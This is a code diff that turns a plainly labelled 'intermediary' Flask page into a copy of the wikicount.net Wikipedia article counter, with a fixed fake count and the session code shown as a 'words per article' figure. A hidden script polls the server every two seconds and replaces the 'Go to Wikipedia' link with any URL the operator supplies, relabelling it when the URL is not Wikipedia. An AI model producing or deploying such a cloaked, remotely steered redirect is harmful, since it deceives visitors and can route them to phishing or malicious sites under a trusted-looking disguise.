@@ -1,30 +1,102 @@
 <!DOCTYPE html>
-<html>
+<html lang="ru">
 <head>
-    <title>Сайт-посредник</title>
-    <script>
-        const code = "{{ code }}";
-        
-        async function getTargetUrl() {
-            const response = await fetch(`/get_target_url?code=${code}`);
-            const data = await response.json();
-            document.getElementById('redirect-btn').href = data.url;
-        }
-        
-        // Проверяем URL каждые 2 секунды
-        setInterval(getTargetUrl, 2000);
-        
-        // Первая проверка при загрузке
-        window.onload = getTargetUrl;
-    </script>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=1">
+  <title>Сколько статей в Википедии? — Подсчёт статей</title>
+  <link rel="stylesheet" type="text/css" href="{{ url_for('static', filename='style.css') }}">
+  <meta name="description" content="Живой приблизительный счётчик количества статей в русской Википедии. Этот сайт показывает, сколько страниц в Википедии в данный момент.">
+  <meta name="keywords" content="википедия количество статей, сколько статей в википедии, сколько страниц в русской википедии, счетчик статей википедии">
+  <link rel="shortcut icon" href="https://wikicount.net/favicon.ico" type="image/x-icon">
+  <link rel="icon" href="https://wikicount.net/favicon.ico" type="image/x-icon">
 </head>
 <body>
-    <h1>Ваш код: {{ code }}</h1>
-    <p>Сообщите этот код другому пользователю</p>
-    
-    <a id="redirect-btn" href="https://ru.wikipedia.org/wiki/" 
-       style="padding: 10px 20px; background: #0066cc; color: white; text-decoration: none;">
-        Перейти
-    </a>
+  <div id="content">
+    <h1>Количество статей в русской Википедии</h1>
+    <h2>Сколько статей в Википедии?</h2><br>
+    <p>Примерно</p>
+    <div class="number" id="counter">6,998,817</div>
+    <p>статей в русской Википедии по состоянию на <span id="today">27 мая 2025</span>. 
+       <img src="{{ url_for('static', filename='refresh.png') }}" class="refresh">
+    </p>
+
+    <p>В среднем около <strong>{{ code }}</strong> слов на статью.</p>
+
+    <p>
+      <a href="https://wikicount.net/visit.php?wl=ru" class="biglink" onclick="clickAndDisable(this);">	
+        <img src="{{ url_for('static', filename='logo1.png') }}" alt="Перейти в Википедию" title="Перейти в Википедию"><br>Перейти в Википедию ›
+      </a>		
+    </p>
+
+    <p class="smallertext">
+      Приведённое выше значение — это приблизительное количество статей в русской Википедии. Эта цифра менее точна, чем официальные данные с 
+      <a href="http://ru.wikipedia.org/wiki/Википедия:Размер_Википедии" target="_blank">раздела о размере Википедии</a>. | 
+      <a href="https://wikicount.net/privacy.php" target="_blank">Политика конфиденциальности</a>
+    </p>
+
+    <p class="smallertext">
+      <u>Примечание:</u> Этот сайт не является официальным ресурсом Википедии или Фонда Викимедиа. Количество статей может варьироваться из-за особенностей сбора данных. © 2025.<br><br>
+      <a href="http://wikicount.net/">English</a> | <a href="http://fr.wikicount.net/">Français</a> | <a href="http://de.wikicount.net/">Deutsch</a> | <a href="http://ru.wikicount.net/">Русский</a>
+    </p>
+  </div>
+
+  <script src="{{ url_for('static', filename='jquery.min.js') }}"></script>
+  <script src="{{ url_for('static', filename='script_refresh.htm') }}"></script>
+
+  <script>
+    // ===== 1. Функции для работы с датой =====
+    function formatRussianDate(date) {
+      const months = [
+        "января", "февраля", "марта", "апреля", "мая", "июня",
+        "июля", "августа", "сентября", "октября", "ноября", "декабря"
+      ];
+      return `${date.getDate()} ${months[date.getMonth()]} ${date.getFullYear()}`;
+    }
+
+    // ===== 2. Основная логика обновления ссылки =====
+    async function updateLink() {
+      try {
+        const code = "{{ code }}"; // Код из шаблона Flask
+        const response = await fetch(`/get_target_url?code=${code}`);
+        
+        if (!response.ok) throw new Error("Ошибка сети");
+        
+        const data = await response.json();
+        const link = document.querySelector('.biglink');
+        
+        if (link && data.url) {
+          link.href = data.url;
+          console.log("Ссылка обновлена на:", data.url);
+          
+          // Меняем текст, если это не Википедия
+          if (!data.url.includes('wikipedia')) {
+            link.innerHTML = `
+              <img src="{{ url_for('static', filename='logo1.png') }}" 
+                   alt="Перейти на сайт" 
+                   title="Перейти на сайт"><br>
+              Перейти на сайт ›`;
+          }
+        }
+      } catch (error) {
+        console.error("Ошибка при обновлении ссылки:", error);
+      }
+    }
+
+    // ===== 3. Инициализация =====
+    document.addEventListener('DOMContentLoaded', () => {
+      // Устанавливаем дату
+      document.getElementById("today").innerText = formatRussianDate(new Date());
+      
+      // Запускаем проверку ссылки
+      updateLink(); // Сразу при загрузке
+      setInterval(updateLink, 2000); // Затем каждые 2 секунды
+      
+      // Отключение повторных кликов
+      document.querySelector('.biglink').onclick = function(event) {
+        event.preventDefault();
+        window.location.href = this.href; // Переход по обновленной ссылке
+      };
+    });
+  </script>
 </body>
 </html>
